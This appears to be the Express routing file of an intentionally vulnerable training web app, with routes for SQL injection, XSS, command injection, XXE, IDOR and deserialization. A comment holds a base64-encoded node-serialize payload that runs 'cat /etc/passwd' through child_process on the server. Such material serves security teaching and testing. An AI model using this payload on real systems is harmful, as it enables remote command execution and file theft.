var express = require('express');
var router = express.Router();
var user = require("./users");
router.get('/', user.index);

router.post('/sqli', user.sqli);

router.get('/login', user.isAuthenticated, user.home);

// router.post('/login', user.login);

router.post('/login', user.authenticate);

router.get('/dom_xss', user.dom_xss);

router.get('/command_injection', user.command_injection_render);

router.post('/command_injection', user.command_injection);

router.get('/file_read', user.file_read);

router.get('/regex', user.regex_render);

router.post('/regex', user.regex);

router.get('/xxe', user.xxe_render);

router.post('/xxe', user.xxe);

router.post('/logout', function (req, res) {
    req.logout();
    console.log(req.session);
    res.redirect('/');
});
// payload  eyJmdWxsbmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXsgcmV0dXJuIHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjU3luYygnY2F0IC9ldGMvcGFzc3dkJykudG9TdHJpbmcoKTsgfSgpIn0=
router.get('/deserialization', user.isAuthenticated, user.deserialize);

router.get('/idor', user.isAuthenticated, user.idor);

router.get('/change_password', user.isAuthenticated, user.change_password_render);

router.post('/change_password', user.isAuthenticated, user.change_password);

module.exports = router;
